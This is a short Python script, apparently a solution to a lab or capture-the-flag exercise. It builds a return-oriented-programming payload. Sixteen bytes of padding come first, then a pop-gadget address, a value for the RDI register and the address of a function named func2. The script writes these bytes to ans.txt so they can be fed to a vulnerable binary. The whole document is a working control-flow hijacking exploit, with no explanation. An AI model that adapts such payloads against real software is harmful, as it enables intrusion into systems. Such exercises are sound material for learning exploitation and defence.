padding = b"0" * 16
func2_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"
pop_addr= b"\xc7\x12\x40\x00\x00\x00\x00\x00"
target_rdi = b"\xf8\x03\x00\x00\x00\x00\x00\x00"

payload = padding + pop_addr + target_rdi + func2_addr

with open("ans.txt", "wb") as f:
    f.write(payload)
print("Payload written.")